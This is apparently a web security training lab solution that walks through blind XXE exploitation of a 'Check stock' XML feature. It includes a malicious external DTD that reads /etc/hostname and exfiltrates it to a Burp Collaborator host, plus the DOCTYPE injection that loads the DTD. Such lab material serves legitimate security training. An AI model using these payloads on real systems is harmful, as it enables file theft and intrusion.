# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.

####  Solution

-  Using Burp Suite Professional, go to the Collaborator tab.
-  Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
-

Place the Burp Collaborator payload into a malicious DTD file:

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

-  Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
-  You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
-

Insert the following external entity definition in between the XML declaration and the `stockCheck` element:

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

-  Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
-  You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the `/etc/hostname` file.

####  Community solutions

Garr_7

Michael Sommer (no audio)
